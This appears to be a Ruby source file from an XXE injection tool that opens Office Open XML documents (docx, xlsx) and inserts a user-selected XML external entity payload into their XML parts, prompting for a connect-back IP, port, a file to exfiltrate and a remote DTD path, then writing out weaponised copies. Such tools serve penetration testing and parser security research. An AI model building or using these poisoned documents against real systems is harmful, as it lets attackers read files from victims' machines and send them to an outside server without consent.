# encoding: ASCII-8BIT
require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'
require 'json'
require './lib/list_files_menu'
require './lib/string_replace'
require './lib/insert_all_files_payload'

# This method retrieves the payloads and allows the user to assign a payload
#	that will be used in the document.
def select_payload
	ploads = payload_list()
	payload = ''
	choose do |menu|
		menu.prompt = 'Choose XXE payload:'
		menu.choice 'Print XXE Payload Values' do
			i = 0
			ploads.each do |pload|
				i = i +1
				puts "#{i}. #{pload[1][1]} \n\t #{pload[1][0]}"
			end
			exit
		end
		ploads.each do |pload|
			menu.choice pload[0] do payload = pload[1][0] end
		end
	end
	if payload =~ /IP/ and @options['ip'].size == 0
		@options['ip'] = ask('Payload Requires a connect back IP:')
		@options['ip'] = set_protocol(@options['ip']).gsub('\\') {'\\\\'}
		payload = payload.gsub('IP', @options['ip'])
	end
	if payload =~ /FILE/ and @options['exfiltrate'].size == 0
		@options['exfiltrate'] = ask('Payload Requires a file to check for:')
		payload = payload.gsub('FILE', @options['exfiltrate'])
	end
	if payload =~ /PORT/ and @options['port'].size == 0
		@options['port'] = ask('Payload allows for connect back port to be specified:')
		payload = payload.gsub('PORT', @options['port'])
	end
	if payload =~ /EXF/ and !@options['rf']
		@options['rf'] = ask('Payload requires a remote file to check for on your server (e.g. /dtd/exfil.dtd):')
		payload = payload.gsub('EXF', @options['rf'])
	end

	return payload
end

# Insert the payload into every XML document in the document
def add_payload_all(fz,payload)
	fz.each do |name|
		add_payload(name, payload)
	end
end

# The menu for selecting the payload and the XML file to insert into
def choose_file(docx)
	fz = read_docx_returns_list_files(docx)
	payload = select_payload

	puts "|+| #{payload} selected"
	choose do |menu|
		menu.prompt = 'Choose File to insert XXE into:'
		menu.choice 'Insert Into All Files Creating Multiple OOXML Files' do add_payload_all(fz, payload) end
		menu.choice 'Insert Into All Files In Same OOXML File' do add_payload_of(fz, payload, '') end
		menu.choice 'Create Entity Canary' do entity_canary(fz, payload) end
		menu.choice "Create XXE 'Content Types' Canary" do entity_canary(fz, payload) end
		fz.each do |name|
			menu.choice name do add_payload(name, payload) end
		end
	end
end

# The meat of the work:
#	reads in the XML file, inserts XXE and then creates the new OXML
def add_payload(name,payloadx)
	document = ''

	# Read in the XLSX and grab the document.xml
	Zip::Archive.open(@options['file'], Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	# get file ext
	ext = @options['file'].split('.').last
	nname = "output_#{Time.now.to_i}_#{name.gsub('.', '_').gsub('/', '_')}"
	rand_file = "./output/#{nname}.#{ext}"

	docx_xml = payload(document,payloadx)

	puts "|+| Creating #{rand_file}"
	FileUtils::copy_file(@options['file'], rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name, docx_xml)
	end
end

# this does a simple substitution of the [X]XE into the document DOCTYPE.
#	It also resets the xml from standalone "yes" to "no"
def payload(document,payload)
	# insert the payload, TO-DO this should be refactored
	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>', '' "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>#{payload.gsub('IP', @options['ip']).gsub('FILE', @options['exfiltrate'])}" '')
	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>', '' "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>#{payload.gsub('IP', @options['ip']).gsub('FILE', @options['exfiltrate'])}" '')
  return document
end